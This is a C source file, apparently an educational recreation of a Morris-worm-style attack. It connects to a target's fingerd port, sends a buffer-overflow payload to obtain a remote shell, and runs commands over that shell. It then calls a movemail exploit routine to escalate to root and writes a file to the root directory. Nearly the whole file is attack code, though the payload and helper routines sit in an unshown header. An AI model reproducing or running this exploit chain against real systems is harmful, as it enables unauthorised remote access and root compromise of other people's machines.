#include "worm.h"

main()
{
    int sock;
    struct sockaddr_in serv_addr;
    char io_buf[IO_BUF_SIZE];
    char buf[BUF_SIZE];
    
	char *echo_command = "echo connected123\n";
	char *export_path = "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n";
	char *whoami = "whoami\n";
	char *ls = "ls -al\n";
	char *touch_file = "cd /; echo Hello from ubuntu! > hello_from_ubuntu; cat hello_from_ubuntu\n";

    sock = socket(AF_INET, SOCK_STREAM, 0);
	create_sockaddr(&serv_addr, TARGET_IP, FINGERD_PORT); 

    if (connect(sock, &serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        exit(1);
    }

    /* Send the buffer overflow payload */
    create_exploit(buf, PAYLOAD, BUF_SIZE, PAYLOAD_LEN);
    write(sock, buf, BUF_SIZE);
    printf("Payload delivered. Waiting for shell...\n");
    sleep(1);

	write_to_sock(sock, echo_command);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

	write_to_sock(sock, export_path);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    write_to_sock(sock, whoami);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

	get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);

	write_to_sock(sock, whoami); 
	read_from_sock(sock, io_buf, IO_BUF_SIZE);
    write_to_sock(sock, whoami);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

	write_to_sock(sock, touch_file); 
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

    close(sock);
    exit(0);
}
